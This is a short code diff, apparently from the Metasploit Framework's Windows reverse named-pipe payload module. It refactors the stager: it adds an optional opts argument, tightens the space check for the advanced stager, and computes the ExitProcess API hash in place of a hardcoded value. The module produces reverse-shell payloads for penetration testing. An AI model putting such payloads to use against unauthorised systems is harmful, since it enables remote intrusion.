@@ -26,7 +26,7 @@ module Payload::Windows::ReverseNamedPipe
   #
   # Generate the first stage
   #
-  def generate
+  def generate(_opts = {})
     conf = {
       name:        datastore['PIPENAME'],
       host:        datastore['PIPEHOST'] || '.',
@@ -35,7 +35,7 @@ module Payload::Windows::ReverseNamedPipe
     }
 
     # Generate the advanced stager if we have space
-    unless self.available_space.nil? || required_space > self.available_space
+    if self.available_space && cached_size && required_space <= self.available_space
       conf[:exitfunk] = datastore['EXITFUNC']
       conf[:reliable] = true
     end
@@ -147,7 +147,7 @@ module Payload::Windows::ReverseNamedPipe
     else
       asm << %Q^
       failure:
-        push 0x56A2B5F0         ; hardcoded to exitprocess for size
+        push #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}
         call ebp
       ^
     end
